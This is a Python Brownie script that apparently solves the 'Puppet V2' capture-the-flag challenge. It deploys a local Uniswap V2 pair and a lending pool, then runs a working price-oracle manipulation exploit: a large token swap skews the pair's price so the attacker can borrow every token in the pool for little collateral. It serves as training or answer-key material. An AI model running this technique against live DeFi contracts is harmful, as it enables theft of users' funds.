from brownie import *
import json
from eth_abi import encode
import contextlib

def deploy_from_bytecode(bytecode):
    with contextlib.redirect_stdout(None):
        la = accounts.add()
    accounts[9].transfer(la, '1 ether')
    signed_tx = web3.eth.account.sign_transaction({
        'nonce': 0,
        'gasPrice': Wei('10 gwei'),
        'gas': chain.block_gas_limit,
        'data': bytecode
    }, la.private_key)
    tx = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    return web3.eth.get_transaction_receipt(tx)['contractAddress']


def main():
    deployer = a[0]

    UNISWAP_INITIAL_TOKEN_RESERVE = Wei('100 ether')
    UNISWAP_INITIAL_WETH_RESERVE = Wei('10 ether')

    ATTACKER_INITIAL_TOKEN_BALANCE = Wei('10000 ether')
    ATTACKER_INITIAL_ETH_BALANCE = Wei('20 ether')
    POOL_INITIAL_TOKEN_BALANCE = Wei('1000000 ether')

    with contextlib.redirect_stdout(None):
        attacker = accounts.add()
    deployer.transfer(attacker, ATTACKER_INITIAL_ETH_BALANCE)

    # deploy tokens to be traded
    token = DamnValuableToken.deploy({'from': deployer})
    weth = WETH9.deploy({'from': deployer})

    # deploy factory
    with open('build-uniswap-v2/UniswapV2Factory.json') as f:
        factory_abi = json.load(f)
    args = encode(['address'], ['0x'+'0'*40]).hex()
    address = deploy_from_bytecode(
                        factory_abi['evm']['bytecode']['object'] + args)
    factory = Contract.from_abi('UniswapV2Factory', address,
                                factory_abi['abi'], owner=deployer)

    # deploy router
    with open('build-uniswap-v2/UniswapV2Router02.json') as f:
        router_abi = json.load(f)
    args = encode(['address','address'], [factory.address,weth.address]).hex()
    address = deploy_from_bytecode(
                        router_abi['evm']['bytecode']['object'] + args)
    router = Contract.from_abi('UniswapV2Router02',
                               address, router_abi['abi'], owner=deployer)

    # create pair and add liquidity
    token.approve(router, UNISWAP_INITIAL_TOKEN_RESERVE, {'from': deployer})
    router.addLiquidityETH(
        token,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        0,
        0,
        deployer,
        chain[-1].timestamp * 2,
        {'from': deployer, 'value': UNISWAP_INITIAL_WETH_RESERVE})

    exchange = interface.IUniswapV2Pair(factory.getPair(token, weth))
    assert exchange.balanceOf(deployer) > 0

    pool = PuppetV2Pool.deploy(weth, token, exchange, factory, {'from': deployer})

    token.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE)
    token.transfer(pool, POOL_INITIAL_TOKEN_BALANCE)

    assert pool.calculateDepositOfWETHRequired(Wei('1 ether')) == Wei('0.3 ether')
    assert pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE) == \
        Wei('300000 ether')


    # Exploit code here
    token.approve(router, Wei('10000 ether'), {'from': attacker})
    router.swapExactTokensForETH(Wei('10000 ether'), Wei('9.9 ether'), [token, weth], attacker, chain[-1].timestamp * 2, {'from': attacker})
    depositRequired = pool.calculateDepositOfWETHRequired(token.balanceOf(pool))
    assert depositRequired < attacker.balance()
    attacker.transfer(weth, depositRequired)
    weth.approve(pool, depositRequired, {'from': attacker})
    pool.borrow(token.balanceOf(pool), {'from': attacker})

    # Success conditions - attacker has taken all tokens from the pool
    assert token.balanceOf(pool) == 0
    assert token.balanceOf(attacker) >= POOL_INITIAL_TOKEN_BALANCE

    print('Challenge successfully passed.')

